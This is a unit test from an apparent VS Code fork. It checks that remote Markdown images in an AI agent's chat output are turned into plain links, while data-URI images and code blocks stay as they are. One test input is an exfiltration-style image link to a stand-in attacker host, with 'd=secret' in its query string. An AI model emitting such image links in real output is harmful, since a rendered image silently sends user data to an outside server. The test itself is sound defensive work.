/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// allow-any-unicode-comment-file (Para Code: this file contains Japanese test comments)

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { paradisAgentChatImagesToLinks } from '../../common/paradisAgentChatMarkdown.js';

suite('paradisAgentChatMarkdown', () => {
	ensureNoDisposablesAreLeakedInTestSuite();

	test('turns remote images into links but keeps data images and code blocks as they are', () => {
		const input = [
			'結果: ![グラフ](https://evil.example/p?d=secret "t")',
			'![](http://example.com/a.png) と `![keep](https://example.com/x.png)`',
			'    ![indented](https://example.com/y.png)',
			'![inline](data:image/png;base64,AAAA)',
			'```md',
			'![code](https://example.com/in-code.png)',
			'```',
		].join('\n');
		assert.deepStrictEqual(paradisAgentChatImagesToLinks(input).split('\n'), [
			'結果: [画像: グラフ](https://evil.example/p?d=secret)',
			'[画像](http://example.com/a.png) と `![keep](https://example.com/x.png)`',
			'    ![indented](https://example.com/y.png)',
			'![inline](data:image/png;base64,AAAA)',
			'```md',
			'![code](https://example.com/in-code.png)',
			'```',
		]);
	});
});
